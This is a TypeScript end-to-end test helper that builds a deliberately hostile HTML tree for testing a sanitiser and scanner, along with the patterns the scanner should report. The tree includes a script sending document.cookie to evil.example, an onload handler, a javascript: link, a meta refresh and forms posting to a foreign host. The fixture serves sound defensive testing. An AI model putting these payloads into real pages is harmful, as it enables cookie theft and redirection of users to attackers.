/**
 * tests/e2e/helpers/hostile-pages.ts
 *
 * Test-only hostile inputs (accessforge-skeleton task 3.2, design "Hostile
 * pages are test-only"). Never under src/, so the deployed Worker cannot serve
 * them.
 */

import type { Node } from '../../../src/lib/legacy-build/html.js';

const el = (tag: string, attrs: Record<string, string> = {}, ...children: Array<Node | string>): Node => ({
  tag,
  attrs,
  children: children.map((c) => (typeof c === 'string' ? { text: c } : c)),
});

/** Text that sits inside elements the sanitiser must remove with their subtree. */
export const REMOVED_TEXT = 'HOSTILE_REMOVED_TEXT_4F8';
/** Text in elements the sanitiser keeps. */
export const KEPT_TEXT = 'Borang pendaftaran ujian';

/**
 * The hostile tree, built without h() so it can hold forbidden tags: a script,
 * an inline handler, a javascript: link, an external image and stylesheet, a
 * meta refresh, a foreign form action and a submit button with a foreign
 * formaction.
 */
export function hostileTree(): Node {
  return el(
    'html',
    { lang: 'ms' },
    el(
      'head',
      {},
      el('meta', { 'http-equiv': 'refresh', content: '0; url=https://evil.example/' }),
      el('link', { rel: 'stylesheet', href: 'https://evil.example/x.css' }),
      el('title', {}, KEPT_TEXT),
    ),
    el(
      'body',
      { onload: 'steal()' },
      el('script', {}, `fetch("https://evil.example/?" + document.cookie); ${REMOVED_TEXT}`),
      el('p', {}, KEPT_TEXT),
      el('a', { href: 'javascript:alert(1)' }, 'Klik di sini'),
      el('img', { src: 'https://evil.example/pixel.png' }),
      el(
        'form',
        { action: 'https://evil.example/collect', method: 'post' },
        el('input', { type: 'text', name: 'nama' }),
        el('input', { type: 'submit', value: 'Hantar', formaction: 'https://evil.example/other' }),
      ),
    ),
  );
}

/** Each construct the scanner must report on the raw hostile tree, as a pattern over its findings. */
export const HOSTILE_CONSTRUCTS: Array<[string, RegExp]> = [
  ['script element', /^script element$/],
  ['inline handler', /^inline handler onload on body$/],
  ['javascript: link', /^javascript: URL in href on a$/],
  ['external image', /^external URL in src on img$/],
  ['external stylesheet', /^external URL in href on link$/],
  ['meta refresh', /^meta refresh$/],
  ['foreign form action', /^external URL in action on form$/],
  ['foreign formaction', /^(formaction attribute on input|external URL in formaction on input)$/],
];
